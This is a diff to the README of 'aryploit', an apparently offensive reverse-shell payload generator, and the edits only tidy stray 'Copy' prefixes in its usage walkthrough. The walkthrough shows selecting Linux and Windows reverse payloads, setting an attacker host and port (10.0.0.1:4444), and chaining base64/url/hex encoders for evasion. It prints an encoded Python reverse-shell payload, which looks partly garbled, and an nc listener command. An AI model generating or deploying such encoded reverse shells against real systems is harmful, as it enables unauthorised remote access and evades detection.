@@ -36,33 +36,35 @@ pip3 install -r requirements.txt
 python3 aryploit.py
 
 1. List Payloads
- Copyaryploit > list rev_payloads linux
+ aryploit > list rev_payloads linux
 reverse/linux/bash_tcp
 reverse/linux/python
 reverse/linux/perl
 ...
 Filter by keyword:
- Copyaryploit > search payload tcp
+ aryploit > search payload tcp
 reverse/linux/bash_tcp
 reverse/windows/powershell
 ...
 2. Select a Payload
- Copyaryploit > use reverse/linux/bash_tcp
+ aryploit > use reverse/linux/bash_tcp
 [+] Loaded payload: reverse/linux/bash_tcp
 Or use set payload:
- Copyaryploit > set payload reverse/linux/bash_tcp
+ aryploit > set payload reverse/linux/bash_tcp
 3. Set LHOST & LPORT
- Copyaryploit > set lhost 10.0.0.1
+ aryploit > set lhost 10.0.0.1
 aryploit > set lport 4444
 4. Apply Encoders (Single or Chained)
- Copyaryploit > set encoder base64,url,hex
+ aryploit > set encoder base64,url,hex
 [+] Encoder chain set: base64, url, hex
 5. Generate Payload
- Copyaryploit > generate
+ aryploit > generate
+
 [+] Generated Payload:
 aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSk7b3MuZHVwMjoocy5maWxlbm8oKSwMCk9TKSwgb3MuZHVwMjoo...
 6. Start a Listener
- Copyaryploit > listener nc
+ aryploit > listener nc
+
 [+] Listener Example (nc): nc -lvnp 4444
 ```
 ## **🛠️ Encoders (Evasion & Obfuscation)**
